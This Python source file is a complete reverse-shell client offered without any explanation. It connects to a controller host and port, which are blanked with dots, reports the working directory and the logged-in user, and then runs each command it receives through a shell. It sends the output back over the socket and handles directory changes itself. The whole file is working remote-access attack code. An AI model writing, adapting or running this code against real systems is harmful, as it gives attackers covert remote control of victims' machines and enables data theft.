import socket, json
import subprocess
import os

HOST = "........"
PORT = ....
MSG_DELIM = "\n"


def send_json(sock, obj):
    try:
        sock.sendall((json.dumps(obj) + MSG_DELIM).encode())
    except Exception:

        return False
    return True

def recv_json(sock):
    buf = ""
    while True:

        sock.settimeout(60) 
        try:
            chunk = sock.recv(4096).decode(errors="replace")
        except socket.timeout:
            continue
        except Exception:

            return None 

        if not chunk:
            return None
        
        buf += chunk
        if MSG_DELIM in buf:
            line, buf = buf.split(MSG_DELIM, 1)
            try:
                return json.loads(line)
            except json.JSONDecodeError:

                continue



def main_loop():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
        except Exception as e:
            print(f"Failed to connect: {e}")
            return


        send_json(s, {"status": "connected", "cwd": os.getcwd(), "user": os.getlogin()})

        print("Connected. Waiting for command...")


        while True:

            command_payload = recv_json(s)

            if command_payload is None:
                print("Controller closed connection.")
                break

            cmd = command_payload
            if cmd.lower() in ("exit", "quit"):
                break
            

            if cmd.lower().startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())

                    send_json(s, {"status": "ok", "cwd": os.getcwd(), "msg": f"Changed directory to {os.getcwd()}"})
                except Exception as e:
                    send_json(s, {"status": "error", "msg": str(e)})
            else:

                try:

                    result = subprocess.run(
                        cmd, 
                        shell=True, 
                        capture_output=True, 
                        text=True, 
                        check=True, 
                        cwd=os.getcwd(),
                        timeout=10 
                    )
                    output = result.stdout + result.stderr

                    send_json(s, {"status": "output", "output": output})
                except subprocess.CalledProcessError as e:
                    send_json(s, {"status": "error", "msg": f"Command failed: {e.stderr}"})
                except subprocess.TimeoutExpired:
                    send_json(s, {"status": "error", "msg": "Command execution timed out."})
                except Exception as e:
                    send_json(s, {"status": "error", "msg": str(e)})

if __name__ == "__main__":
    main_loop()

